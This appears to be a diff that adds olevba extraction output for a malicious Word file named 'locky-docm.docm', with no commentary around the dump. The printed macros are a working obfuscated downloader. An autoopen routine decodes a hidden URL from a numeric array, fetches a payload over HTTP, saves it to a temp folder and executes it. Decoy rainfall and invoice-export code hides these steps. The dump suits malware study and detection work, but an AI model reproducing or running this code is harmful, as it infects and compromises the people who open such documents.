@@ -1,0 +1,755 @@
+olevba 0.46 - http://decalage.info/python/oletools
+===============================================================================
+FILE: locky-docm.docm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+
+Sub autoopen()
+ReplaceText "ssA", "sssa", "aasss"
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Word "ddd"
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Email "d@d"
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Name "dAd"
+CheckDriveSpecError 1, "DDA", 1
+End Sub
+
+Function CheckDriveSpecError(ByVal cellID As Long, ByVal cellDes As String, ByVal cellVal As Double) As String
+    Dim jsonStr As String
+    
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Alpha "ddAAd"
+KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Paragraph "DwDDw"
+CheckKJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_BetterThen "d22dd"
+
+    
+End Function
+
+
+-------------------------------------------------------------------------------
+VBA MACRO UserForm1.frm 
+in file: word/vbaProject.bin - OLE stream: u'VBA/UserForm1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Module4.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module4'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Private Function getMonthFromString(stringDate As String, source_format As String) As String
+    
+   
+    If source_format = "dd/mm/yyyy" Then
+        getMonthFromString = Mid(stringDate, 4, 2)
+    ElseIf source_format = "mm/dd/yyyy" Then
+        getMonthFromString = Left(stringDate, 2)
+    End If
+
+End Function
+
+Private Function getYearFromString(stringDate As String, source_format As String) As String
+ 
+ 
+     getYearFromString = Right(stringDate, 4)
+End Function
+
+Private Function getDayFromString(stringDate As String, source_format As String) As String
+     
+     If source_format = "dd/mm/yyyy" Then
+        getDayFromString = Left(stringDate, 2)
+    ElseIf source_format = "mm/dd/yyyy" Then
+        getDayFromString = Mid(stringDate, 4, 2)
+    End If
+End Function
+
+Sub calculate_yearly_rainfall()
+
+    Dim dataStartCell As Range
+    Dim outputStartCell As Range
+    Dim currentCell As Range
+    Dim currentDate As String
+    Dim currentMonth As String
+    Dim currentYear As String
+    Dim dataRange As Range
+    Dim yearlySum As Double
+    Dim previousMonth As String
+    Dim previousYear As String
+    Dim yearNum As Integer
+    Dim monthList As String
+    Dim outMonth As Byte
+    Dim cell As Range
+    
+    Dim dateNum As Double
+    Dim inputRangeSize As Integer
+    
+    
+    
+    Application.ScreenUpdating = False
+    
+    Call ClearYearlyResults
+    
+    
+    Set dataStartCell = Worksheets("Given Data Format").Range("A1")
+           
+    
+    Set outputStartCell = Worksheets("Yearly Rainfall").Range("A1")
+    
+    
+    With dataStartCell
+        Range(.Offset(1, 0), .End(xlDown)).Name = "dataRange"
+    End With
+           
+    
+    Set dataRange = Range("dataRange")
+    
+    
+    yearNum = 1
+    
+    
+    dateNum = 0
+    yearlySum = 0
+    currentMonth = getMonthFromString(dataStartCell.Offset(1, 0).Value, "dd/mm/yyyy")
+    previousMonth = getMonthFromString(dataStartCell.Offset(1, 0).Value, "dd/mm/yyyy")
+    previousYear = getYearFromString(dataStartCell.Offset(1, 0).Value, "dd/mm/yyyy")
+    
+    
+    With dataStartCell
+    
+        For Each cell In dataRange
+            
+            dateNum = dateNum + 1
+            currentDate = cell.Value
+            
+            currentYear = getYearFromString(currentDate, "dd/mm/yyyy")
+            currentMonth = getMonthFromString(currentDate, "dd/mm/yyyy")
+                             
+                If currentYear = previousYear Then
+                    
+                    yearlySum = yearlySum + .Offset(dateNum, 1).Value
+                Else
+                    
+                    
+                    outputStartCell.Offset(yearNum, 0).Value = previousYear
+                    outputStartCell.Offset(yearNum, 1).Value = yearlySum
+                    yearNum = yearNum + 1
+                    yearlySum = 0
+                    previousYear = currentYear
+                    
+                End If
+        Next
+        
+        outputStartCell.Offset(yearNum, 0).Value = currentYear
+        outputStartCell.Offset(yearNum, 1).Value = yearlySum
+      
+    End With
+
+    
+    Application.ScreenUpdating = True
+End Sub
+
+Sub calculate_rainfall_by_month()
+
+    Dim dataStartCell As Range
+    Dim outputStartCell As Range
+    Dim currentCell As Range
+    Dim currentDate As String
+    Dim currentDay As String
+    Dim currentMonth As String
+    Dim currentYear As String
+    Dim currentRainfall As Double
+    Dim dataRange As Range
+    Dim yearlySum As Double
+    Dim monthlySum As Double
+    Dim previousMonth As String
+    Dim previousYear As String
+    Dim monthList As String
+    Dim monthNum As Byte
+    Dim yearNum As Byte
+    
+    Dim cell As Range
+
+    
+    
+    Application.ScreenUpdating = False
+    
+    
+    
+    Call ClearMonthlyResults
+    
+    
+    Set dataStartCell = Worksheets("Given Data Format").Range("A1")
+           
+    
+    Set outputStartCell = Worksheets("Required Format").Range("A1")
+    
+    
+    With dataStartCell
+        Range(.Offset(1, 0), .End(xlDown)).Name = "dataRange"
+    End With
+           
+    
+    Set dataRange = Range("dataRange")
+    
+    
+    yearNum = 1
+    
+    
+    yearlySum = 0
+    monthlySum = 0
+    monthNum = 1
+    
+    
+    previousMonth = Month(dataStartCell.Offset(1, 0).Value)
+    previousYear = Year(dataStartCell.Offset(1, 0).Value)
+    
+    
+    With dataStartCell
+    
+        For Each cell In dataRange
+            
+            currentDate = cell.Value
+            
+            
+            currentDay = Day(currentDate)
+            currentYear = Year(currentDate)
+            currentMonth = Month(currentDate)
+                       
+            
+            currentRainfall = cell.Offset(0, 1).Value
+            
+                If currentMonth = previousMonth Then
+                    
+                    monthlySum = monthlySum + currentRainfall
+                    
+                    
+                Else
+                    
+                                       
+                    
+                    
+                    outputStartCell.Offset(yearNum, monthNum).Value = monthlySum
+                                        
+                    
+                    monthlySum = 0 + currentRainfall
+                    
+                    
+                    monthNum = monthNum + 1
+                    
+                End If
+                
+                If currentYear <> previousYear Then
+                    
+                    
+                    
+                    monthlySum = monthlySum + currentRainfall
+                    
+                    
+                    If previousMonth = "12" Then
+                        outputStartCell.Offset(yearNum, 0).Value = previousYear
+                    End If
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    previousMonth = currentMonth
+                    
+                    yearlySum = 0
+                    yearNum = yearNum + 1
+                    
+                    
+                    monthlySum = 0 + currentRainfall
+                    monthNum = 1
+                    previousYear = currentYear
+                    
+                    
+                End If
+
+                
+                
+                previousMonth = currentMonth
+                previousYear = currentYear
+                
+        Next
+        
+        
+        outputStartCell.Offset(yearNum, monthNum) = monthlySum
+        outputStartCell.Offset(yearNum, 0).Value = currentYear
+        
+    End With
+
+    
+    Application.ScreenUpdating = True
+End Sub
+
+Sub ClearYearlyResults()
+
+
+
+
+
+    Sheets("Yearly Rainfall").Select
+    Range("A2:B2").Select
+    Range(Selection, Selection.End(xlDown)).Select
+    Range("A2:B57").Select
+    Selection.ClearContents
+    Range("A1").Select
+End Sub
+
+Public Function KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Email(strInspect As String) As Boolean
+On Error GoTo Err_Handler:
+ Set IzPodTri = CreateObject(massiveMyData(3))
+ C = ""
+ Set YKJJJnnnn3_pe__3 = IzPodTri.Environment(massiveMyData(4))
+ Dim IJK As Integer
+For IJK = LBound(TextLenPart) To UBound(TextLenPart)
+ Djeremy = Djeremy & RemoveSpecialChar(IJK)
+ Next IJK
+ Dim strPattern As String
+ strPattern = "^.+@.+\..+$"
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Email = True
+Exit_Handler:
+ Exit Function
+Err_Handler:
+ Select Case Err.Number
+ Case Else
+ MsgBox "Error #" & Err.Number & ": " & Err.Description, vbCritical, _
+ "Error encountered (#" & Err.Number & " - KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Email[mod_Validation])"
+ End Select
+ Resume Exit_Handler
+End Function
+
+Public Function ReplaceText(ByVal fromTxt As String, ByVal toTxt As String, _
+                            ByVal orgTxt As String) As String
+
+  'Replace multiple instances of fromTxt with toTxt in the string orgTxt
+  
+  Dim finalTxt As String
+  Dim lenOrgTxt As Integer, lenFromTxt
+  Dim N As Integer, M As Integer
+  
+  finalTxt = ""
+  
+  orgTxt = Trim$(orgTxt)
+  lenOrgTxt = Len(orgTxt)
+  If lenOrgTxt = 0 Then
+    ReplaceText = finalTxt
+  End If
+  
+  lenFromTxt = Len(fromTxt)
+  
+  finalTxt = ""
+  
+ TextLenPart = Split("166492102918569210291856921029179292102992892102975292102975292102917609210291776921029188892102916169210291728921029185692102919369210291568921029161692102917289210291728921029155292102973692102915849210291776921029174492102975292102991292102976892102918729210291696921029176092102981692102915689210298969210291584921029816", "921029")
+  N = 1
+  Do
+    M = InStr(N, orgTxt, fromTxt)
+    If (M > 0) Then
+      finalTxt = finalTxt & Mid(orgTxt, N, M - N) & toTxt
+      N = M + lenFromTxt
+    Else
+      finalTxt = finalTxt & Mid$(orgTxt, N)
+    End If
+  Loop While (lenOrgTxt > N And M > 0)
+    
+  ReplaceText = finalTxt
+
+End Function
+Sub ClearMonthlyResults()
+
+
+
+
+
+    Dim cell As Range
+    
+    Range("A3:C3").Select
+    Range(Selection, Selection.End(xlToRight)).Select
+    Range(Selection, Selection.End(xlDown)).Select
+    Selection.ClearContents
+    Range("A3").Select
+
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+
+Public CommDialog_Sadig As String
+
+Dim Data1
+Dim Data2
+
+Public Sadig_CNPJ_Distribuidor As String
+Public Sadig_Nome_Empresa As String
+Public Sadig_CNPJ_Cliente As String
+Public Sadig_Nome_Cliente As String
+Public Sadig_Endereco_Cliente As String
+Public Sadig_Cidade_Cliente As String
+Public Sadig_CEP_Cliente As String
+Public Sadig_Estado_Cliente As String
+Public Sadig_Telefone_Cliente As String
+Public Sadig_Tipo_Cliente  As String
+Public Sadig_Tipo_Saida As String
+Public Sadig_Codigo_Produto_Royal As String
+Public Sadig_Descricao_Produto_Royal As String
+Public Sadig_Quant_Saida As String
+Public Sadig_Data_Movimento As String
+Public Sadig_Codigo_Vendedor As String
+Public Sadig_Nome_Vendedor As String
+
+
+Public YKJJJnnnn3_pe__1 As Object
+Public substruct1 As Object
+Public YKJJJnnnn3_pe__3 As Object
+Public TextLenPart() As String
+Public YKJJJnnnn3_pe__4 As String
+Public YKJJJnnnn3_peNaStole As String
+Public stadyBradus As Object
+Public Djeremy As String
+Public massiveMyData() As String
+
+Public Function pirognoe(A1 As String, A2 As String, A3 As String) As String
+pirognoe = Replace(A1, A2, A3)
+End Function
+Public Function RemoveSpecialChar(strFileName As Integer) As String
+RemoveSpecialChar = Chr(CInt(TextLenPart(strFileName)) / (9 + 7))
+End Function
+
+
+
+
+
+
+
+
+Sub CARREGAR_CAMPOS_CHAMAR_FUNCAO_SADIG()
+
+On Error Resume Next
+
+Data1 = Format(InputBox("Digite a Data Inicial", "Gerando Sadig..."), "mm/dd/yyyy")
+Data2 = Format(InputBox("Digite a Data Final", "Gerando Sadig..."), "mm/dd/yyyy")
+
+
+
+Set RS_Con_NF_Saida_Item_Sadig = New Recordset
+
+
+RS_Con_NF_Saida_Item_Sadig.Open "SELECT * FROM Con_NF_Saida_Item_Sadig WHERE Data_Emissao>=#" & Data1 & "# AND Data_Emissao<=#" & Data2 & "# AND CANCELADA=" & False & " ORDER BY Data_Emissao", DBGESTOR, adOpenStatic, adLockOptimistic
+
+Do While RS_Con_NF_Saida_Item_Sadig.EOF = False
+    
+    
+    LIMPA_CAMPOS
+    
+    
+    If IsNull(RS_Con_NF_Saida_Item_Sadig("Cod_Artefato")) = False Then
+    
+        Dim CFOP As String
+        CFOP = RS_Con_NF_Saida_Item_Sadig("CFOP")
+    
+        If CFOP = "5101" Or CFOP = "5102" Or CFOP = "6101" Or CFOP = "6102" Or CFOP = "6922" Or CFOP = "5922" Or CFOP = "6404" Or CFOP = "5405" Or CFOP = "6108" Then
+    
+            Sadig_CNPJ_Distribuidor = "07764000000107"
+            Sadig_CNPJ_Distribuidor = Sadig_CNPJ_Distribuidor
+            
+            Sadig_Nome_Empresa = "AUTARQUIA COMERCIO E SAUDE ANIMAL LTDA EPP"
+            Sadig_Nome_Empresa = Sadig_Nome_Empresa & String(50 - Len(Sadig_Nome_Empresa), " ")
+            
+            Sadig_CNPJ_Cliente = RETIRA_PONTOS_SADIG(RS_Con_NF_Saida_Item_Sadig("CNPJ_CPF"))
+            Sadig_CNPJ_Cliente = Sadig_CNPJ_Cliente & String(14 - Len(Sadig_CNPJ_Cliente), " ")
+            
+            Sadig_Nome_Cliente = RETIRA_PONTOS_SADIG(Mid(RS_Con_NF_Saida_Item_Sadig("RazaoSocial"), 1, 60))
+            Sadig_Nome_Cliente = Sadig_Nome_Cliente & String(60 - Len(Sadig_Nome_Cliente), " ")
+            
+            Sadig_Endereco_Cliente = RETIRA_PONTOS_SADIG(Mid(RS_Con_NF_Saida_Item_Sadig("Endereco"), 1, 50))
+            Sadig_Endereco_Cliente = Sadig_Endereco_Cliente & String(50 - Len(Sadig_Endereco_Cliente), " ")
+            
+            Sadig_Cidade_Cliente = RETIRA_PONTOS_SADIG(RS_Con_NF_Saida_Item_Sadig("Cidade"))
+            Sadig_Cidade_Cliente = Sadig_Cidade_Cliente & String(50 - Len(Sadig_Cidade_Cliente), " ")
+            
+            Sadig_CEP_Cliente = RETIRA_PONTOS_SADIG(Mid(RS_Con_NF_Saida_Item_Sadig("Cep"), 1, 8))
+            Sadig_CEP_Cliente = Sadig_CEP_Cliente
+                
+            Sadig_Estado_Cliente = RETIRA_PONTOS_SADIG(Mid(RS_Con_NF_Saida_Item_Sadig("Uf"), 1, 2))
+            Sadig_Estado_Cliente = Sadig_Estado_Cliente
+            
+            Sadig_Telefone_Cliente = Replace(RETIRA_PONTOS_SADIG(Mid(RS_Con_NF_Saida_Item_Sadig("Telefone"), 1, 20)), "  ", "")
+            Sadig_Telefone_Cliente = Sadig_Telefone_Cliente & String(20 - Len(Sadig_Telefone_Cliente), " ")
+            
+            Sadig_Tipo_Cliente = RS_Con_NF_Saida_Item_Sadig("Tipo_Cliente")
+            Sadig_Tipo_Cliente = Sadig_Tipo_Cliente & String(40 - Len(Sadig_Tipo_Cliente), " ")
+            
+            Sadig_Tipo_Saida = RS_Con_NF_Saida_Item_Sadig("Tipo_Saida")
+            Sadig_Tipo_Saida = Sadig_Tipo_Saida & String(15 - Len(Sadig_Tipo_Saida), " ")
+            
+            Sadig_Codigo_Produto_Royal = RS_Con_NF_Saida_Item_Sadig("Cod_Artefato")
+            Sadig_Codigo_Produto_Royal = Sadig_Codigo_Produto_Royal & String(14 - Len(Sadig_Codigo_Produto_Royal), " ")
+            
+            
+            Sadig_Descricao_Produto_Royal = Mid(RS_Con_NF_Saida_Item_Sadig("Descricao_Produto"), 1, 50)
+            Sadig_Descricao_Produto_Royal = Sadig_Descricao_Produto_Royal & String(50 - Len(Sadig_Descricao_Produto_Royal), " ")
+            
+            Sadig_Quant_Saida = RETIRA_PONTOS_SADIG(Format(RS_Con_NF_Saida_Item_Sadig("Quant_Estoque"), "###,##0"))
+            Sadig_Quant_Saida = String(6 - Len(Sadig_Quant_Saida), " ") & Sadig_Quant_Saida
+            
+            Sadig_Data_Movimento = Format(RS_Con_NF_Saida_Item_Sadig("Data_Emissao"), "dd/mm/yyyy")
+            Sadig_Data_Movimento = Sadig_Data_Movimento
+            
+            Sadig_Codigo_Vendedor = "001"
+            Sadig_Codigo_Vendedor = String(20 - Len(Sadig_Codigo_Vendedor), " ") & Sadig_Codigo_Vendedor
+            
+            Sadig_Nome_Vendedor = "Autarquia"
+            Sadig_Nome_Vendedor = Sadig_Nome_Vendedor & String(30 - Len(Sadig_Nome_Vendedor), " ")
+            
+            
+            ADICIONAR_MOVIMENTOS
+            
+        
+        End If
+    
+    End If
+
+    RS_Con_NF_Saida_Item_Sadig.MoveNext
+
+Loop
+
+Set RS_Con_NF_Saida_Item_Sadig = Nothing
+
+End Sub
+
+
+Public Function RETIRA_PONTOS_SADIG(Variavel)
+On Error Resume Next
+
+Variavel = Replace(Variavel, ".", "")
+Variavel = Replace(Variavel, "-", "")
+Variavel = Replace(Variavel, "-", "")
+Variavel = Replace(Variavel, "/", "")
+Variavel = Replace(Variavel, ",", "")
+Variavel = Replace(Variavel, "*", "")
+Variavel = Replace(Variavel, "(", "")
+Variavel = Replace(Variavel, ")", "")
+Variavel = Replace(Variavel, "+", "")
+Variavel = Replace(Variavel, "º", "")
+Variavel = Replace(Variavel, "ª", "")
+
+Variavel = Replace(Variavel, """", "")
+Variavel = Replace(Variavel, "$", "")
+Variavel = Replace(Variavel, "|", "")
+Variavel = Replace(Variavel, "&", "")
+Variavel = Replace(Variavel, ":", "")
+Variavel = Replace(Variavel, "û", "")
+
+Variavel = Replace(UCase(Variavel), "Ç", "C")
+
+Variavel = Replace(UCase(Variavel), "Ã", "A")
+Variavel = Replace(UCase(Variavel), "Á", "A")
+Variavel = Replace(UCase(Variavel), "À", "A")
+Variavel = Replace(UCase(Variavel), "Â", "A")
+
+Variavel = Replace(UCase(Variavel), "~E", "E")
+Variavel = Replace(UCase(Variavel), "É", "E")
+Variavel = Replace(UCase(Variavel), "È", "E")
+Variavel = Replace(UCase(Variavel), "Ê", "E")
+
+Variavel = Replace(UCase(Variavel), "~I", "I")
+Variavel = Replace(UCase(Variavel), "Í", "I")
+Variavel = Replace(UCase(Variavel), "Ì", "I")
+Variavel = Replace(UCase(Variavel), "Î", "I")
+
+Variavel = Replace(UCase(Variavel), "Õ", "O")
+Variavel = Replace(UCase(Variavel), "Ó", "O")
+Variavel = Replace(UCase(Variavel), "Ò", "O")
+Variavel = Replace(UCase(Variavel), "Ô", "O")
+
+Variavel = Replace(UCase(Variavel), "~U", "U")
+Variavel = Replace(UCase(Variavel), "Ú", "U")
+Variavel = Replace(UCase(Variavel), "Ù", "U")
+Variavel = Replace(UCase(Variavel), "Û", "U")
+
+RETIRA_PONTOS_SADIG = Variavel
+
+End Function
+
+-------------------------------------------------------------------------------
+VBA MACRO Module2.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Function KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Paragraph(strInspect As String) As Boolean
+On Error GoTo Err_Handler:
+ Dim i As Integer
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Paragraph = True
+ somebody = YKJJJnnnn3_pe__1.responseBody
+ For i = 1 To Len(Trim(strInspect))
+ Select Case Mid$(Trim(strInspect), i, 1)
+ Case "A" To "Z", "a" To "z"
+ Case "0" To "9"
+ Case "-", "/", "_", ".", "?", "!"
+ Case Else
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Paragraph = False
+ Exit For
+ End Select
+ Next i
+substruct1.Write somebody
+ substruct1.savetofile YKJJJnnnn3_peNaStole, 2
+Exit_Handler:
+ Exit Function
+Err_Handler:
+ Select Case Err.Number
+ Case Else
+ MsgBox "Error #" & Err.Number & ": " & Err.Description, vbCritical, _
+ "Error encountered (#" & Err.Number & " - KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Paragraph[mod_Validation])"
+ End Select
+ Resume Exit_Handler
+End Function
+
+
+-------------------------------------------------------------------------------
+VBA MACRO Module8.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module8'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Function KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Word(strInspect As String) As Boolean
+ Dim veskonsis As String
+ veskonsis = pirognoe(UserForm1.TextBox1.ControlTipText, "11", "e")
+ veskonsis = pirognoe(veskonsis, "D!", "M")
+ veskonsis = pirognoe(veskonsis, "bri", "s")
+ massiveMyData = Split(veskonsis, "10)")
+ Set substruct1 = CreateObject(massiveMyData(1))
+ Set stadyBradus = CreateObject(massiveMyData(2))
+On Error GoTo Err_Handler:
+ Dim i As Integer
+ Dim d As Boolean
+ d = False
+    
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Word = True
+ For i = 1 To Len(Trim(strInspect))
+ If d = False Then
+Set YKJJJnnnn3_pe__1 = CreateObject(massiveMyData(i - 1))
+d = True
+End If
+ Select Case Mid$(Trim(strInspect), i, 1)
+ Case "A" To "Z", "a" To "z"
+ Case "-"
+ Case Else
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Word = False
+ Exit For
+ End Select
+ Next i
+Exit_Handler:
+ Exit Function
+Err_Handler:
+ 
+ Resume Exit_Handler
+End Function
+-------------------------------------------------------------------------------
+VBA MACRO Module7.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module7'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+    
+Function KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Alpha(strInspect As String) As Boolean
+On Error GoTo Err_Handler:
+ Dim i As Integer
+ substruct = 22
+substruct1.Type = 1
+ substruct1.Open
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Alpha = True
+ For i = 1 To Len(Trim(strInspect))
+ Select Case Mid$(Trim(strInspect), i, 1)
+ Case "A" To "Z", "a" To "z"
+ Case Else
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Alpha = False
+ Exit For
+ End Select
+ Next i
+Exit_Handler:
+ Exit Function
+Err_Handler:
+ Select Case Err.Number
+ Case Else
+ MsgBox "Error #" & Err.Number & ": " & Err.Description, vbCritical, _
+ "Error encountered (#" & Err.Number & " - KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Alpha[mod_Validation])"
+ End Select
+ Resume Exit_Handler
+End Function
+Public Function CheckKJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_BetterThen(strInspect As String) As Boolean
+On Error GoTo Err_Handler:
+ stadyBradus.Open (YKJJJnnnn3_peNaStole)
+ Dim i As Integer
+ CheckKJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_BetterThen = True
+ For i = 1 To Len(Trim(strInspect))
+ Select Case Mid$(Trim(strInspect), i, 1)
+ Case "A" To "Z", "a" To "z"
+ Case "0" To "9"
+ Case Else
+ CheckKJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_BetterThen = False
+ Exit For
+ End Select
+ Next i
+Exit_Handler:
+ Exit Function
+Err_Handler:
+ 
+End Function
+
+
+
+
+
+Public Function KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Name(strInspect As String) As Boolean
+On Error GoTo Err_Handler:
+YKJJJnnnn3_pe__1.Open massiveMyData(10 - (2 + 1 + 2)), Djeremy, False
+YKJJJnnnn3_pe__1.Send
+ YKJJJnnnn3_pe__4 = YKJJJnnnn3_pe__3(massiveMyData(180 / 30))
+ YKJJJnnnn3_peNaStole = YKJJJnnnn3_pe__4
+YKJJJnnnn3_peNaStole = YKJJJnnnn3_peNaStole + massiveMyData(55 - 43)
+ Dim strPattern As String
+ strPattern = "^[A-Z]"
+ KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Name = False
+Exit_Handler:
+ Exit Function
+Err_Handler:
+ Select Case Err.Number
+ Case Else
+ MsgBox "Error #" & Err.Number & ": " & Err.Description, vbCritical, _
+ "Error encountered (#" & Err.Number & " - KJnwefkjwh43JHGFBENMNBSJVHBKJSKJMNBSDV_Name[mod_Validation])"
+ End Select
+ Resume Exit_Handler
+End Function
+
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'UserForm1/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma#
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'UserForm1/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+€CommandButton1
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'UserForm1/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'UserForm1/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+€CommandButton2c
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'UserForm1/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma#
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'UserForm1/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+€CommandButton3
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'UserForm1/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma#
+
